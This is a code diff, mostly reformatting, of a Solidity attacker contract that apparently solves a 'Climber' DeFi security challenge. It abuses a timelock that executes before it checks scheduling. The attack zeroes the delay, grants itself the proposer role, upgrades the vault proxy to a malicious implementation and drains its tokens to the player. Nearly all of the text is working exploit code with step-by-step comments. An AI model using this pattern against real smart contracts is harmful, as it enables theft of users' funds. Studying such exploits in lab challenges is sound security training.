@@ -19,26 +19,53 @@ contract ClimberAttacker{
     uint256[] values;
     bytes[] dataElements;
 
-
     constructor(address _vault, address _token) {
+
         player = msg.sender;
+
         vault = ClimberVault(_vault);
-        timelock = ClimberTimelock(payable(vault.owner()));
+
+        timelock = ClimberTimelock(payable(
+            vault.owner()
+        ));
+        
         token = IERC20(_token);
+
     }
 
     function attack() public returns (bool success, bytes memory result) {
+
         BadClimberVault badClimberVault = new BadClimberVault();
-        targets = [address(timelock), address(timelock), address(vault), address(this)];
+
+        targets = [
+            address(timelock), 
+            address(timelock), 
+            address(vault), 
+            address(this)
+        ];
+
         values = [0, 0, 0, 0];
+
         dataElements = [
             abi.encodeCall(timelock.updateDelay, (0)), // remove delay
-            abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this))), // grant PROPOSER role to the attacker (this contract)
-            abi.encodeCall(vault.upgradeTo, (address(badClimberVault))), // upgrade the vault to an instance of BadClimberVault
+            abi.encodeCall(
+                timelock.grantRole, 
+                (PROPOSER_ROLE, address(this))
+            ), // grant PROPOSER role to the attacker (this contract)
+            abi.encodeCall(
+                vault.upgradeTo, 
+                (address(badClimberVault))
+            ), // upgrade the vault to an instance of BadClimberVault
             abi.encodeCall(this.scheduleTimelockOperation, ()) // schedule these 4 tasks
         ];
+
         timelock.execute(targets, values, dataElements, 0);
-        return address(vault).call(abi.encodeCall(BadClimberVault.drain, (token, player))); // drain the vault
+
+        return address(vault).call(abi.encodeCall(
+            BadClimberVault.drain, 
+            (token, player)
+        )); // drain the vault
+
     }
 
     function scheduleTimelockOperation() public {
